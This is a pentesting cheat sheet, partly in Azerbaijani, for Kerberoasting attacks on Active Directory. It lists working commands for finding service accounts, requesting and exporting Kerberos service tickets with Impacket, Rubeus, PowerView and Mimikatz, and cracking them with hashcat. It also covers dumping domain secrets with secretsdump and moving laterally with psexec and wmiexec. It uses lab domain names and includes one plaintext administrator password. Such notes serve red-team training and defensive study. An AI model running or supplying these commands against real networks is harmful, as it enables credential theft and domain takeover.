# Kerberoasting

### Linux

```
============ From Linux ============
# LDAP Query
ldapsearch -x -h dc-ip -b "DC=domain,DC=com" "(servicePrincipalName=*)" servicePrincipalName sAMAccountName memberOf
ldapsearch -x -h dc-ip -b "DC=domain,DC=com" -H ldap://dc-ip "(servicePrincipalName=*)" servicePrincipalName userAccountControl sAMAccountName

# Netexec
nxc ldap 192.168.0.239 -u 'Administrator' -p 'sako2005!' --kerberoasting hashes.txt

# SPN Users Enum and TGS Dump
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/ ( Anonymous )
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/user:password -request-user <KERBEROASTABLE_USER> -outputfile <HASH>

# Secretdumps
secretsdump.py -just-dc domain/admin@dc-ip
```

### Windows
```
============ From Windows ============
# SPN Users
Import-Module .\PowerView.ps1
Get-DomainUser -SPN -Properties samaccountname,admincount,pwdlastset,msds-supportedencryptiontypes
Get-DomainUser -LDAPFilter "(&(servicePrincipalName=*)(admincount=1))" | Select Name

Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
tr -d ' \n' < messy_hash.txt > clean_hash.txt


# SetSPN
setspn.exe -Q */*
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

### Toolsuz Kerberoasting
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# Mimikatz
mimikatz # base64 /out:true
mimikatz # kerberos::list /export

echo "<base64 blob>" |  tr -d \\n
cat encoded_file | base64 -d > sqldev.kirbi
kirbi2john.py sqldev.kirbi
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 

# Service Accounts
Get-NetUser -ServiceAccount
Get-DomainSPN -Identity *<SERVICE_NAME>* | Select serviceprincipalname,distinguishedname

# Rubeus
.\Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.txt /stats
.\Rubeus.exe kerberoast /tgtdeleg /ldapfilter:'admincount=1' /nowrap
.\Rubeus.exe kerberoast /tgtdeleg /user:targetuser /nowrap

Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

$krb5tgs$18$ -m 19700
$krb5tgs$23$ -m 13100
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
```

## Attack Vector

```
# TGS Request və Dump
GetUserSPNs.py -request -dc-ip dc-ip 'domain\user:password' -target-user svc-sql -outputfile roast.txt

echo "svc-sql\nsvc-web" > users.txt
GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile hashes.txt

# Hash Crack ( Kerberos 5 TGS-REP etype 23 )
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force

# Rubeus
Rubeus.exe kerberoast /user:svc-sql /service:HTTP/web.domain.com /ptt

# CrackMapExec
cme smb dc-ip -u user -p pass -M kerberoast
```

## Post Exploitation

```
secretsdump.py 'domain/svc-sql:crackedpass'@dc-ip -just-dc-user admin

wmiexec.py 'domain/svc-sql:crackedpass'@target-server
psexec.py 'domain/svc-sql:crackedpass'@target-server

